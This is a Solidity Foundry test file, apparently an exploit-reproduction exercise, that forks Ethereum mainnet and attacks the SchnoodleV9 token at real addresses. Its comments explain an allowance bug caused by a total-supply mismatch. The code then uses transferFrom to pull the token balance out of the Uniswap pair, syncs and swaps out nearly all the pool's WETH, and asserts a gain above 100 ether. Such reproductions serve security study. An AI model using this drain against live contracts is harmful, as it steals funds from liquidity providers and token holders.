// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/SchnoodleV9.sol";
import "../src/interfaces/IUniswapV2Pair.sol";
import "../src/interfaces/IWETH9.sol";

contract SchnoodleHack is Test {
    SchnoodleV9 snood = SchnoodleV9(0xD45740aB9ec920bEdBD9BAb2E863519E59731941);
    IUniswapV2Pair uniswap = IUniswapV2Pair(0x0F6b0960d2569f505126341085ED7f0342b67DAe);
    IWETH9 weth = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function testSchnoodleHack() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), 14983600);
        console.log("Your Starting WETH Balance:", weth.balanceOf(address(this)));

        // INSERT EXPLOIT HERE
        
        // SchnoodleV9Base._totalSupply vs ERC777Upgradeable._totalSupply big difference 
        // SchnoodleV9Base._totalSupply = initialTokens * 10 ** decimals(); => 1000000000000 * 1e18 = 1000000000000000000000000000000 
        // ERC7ERC777Upgradeable._totalSupply = (2^256 - 1) - ((2^256 - 1) % SchnoodleV9Base._totalSupply) => 115792089237316195423570985008687907853269984665000000000000000000000000000000
        // results in SchnoodleV9Base._getStandardAmount returning 0 in _spendAllowance() because _getReflectRate returns too big
        // of a number due to initialization of the _totalSupply's
        // results in 0 allowance being spent allowing everyone to transfer tokens from anyone via transferFrom. 
        // too many words, do exploit pls

        uint256 uniSnoodBalance = snood.balanceOf(address(uniswap)) - 1;
        snood.transferFrom(address(uniswap), address(this), uniSnoodBalance);
        uniswap.sync();
        (uint112 reservesWETH, ,) = uniswap.getReserves();
        snood.transfer(address(uniswap), uniSnoodBalance);
        uniswap.swap(reservesWETH - 1, 0, address(this), "");

        console.log("Your Final WETH Balance:", weth.balanceOf(address(this)));
        assert(weth.balanceOf(address(this)) > 100 ether);
    }
}
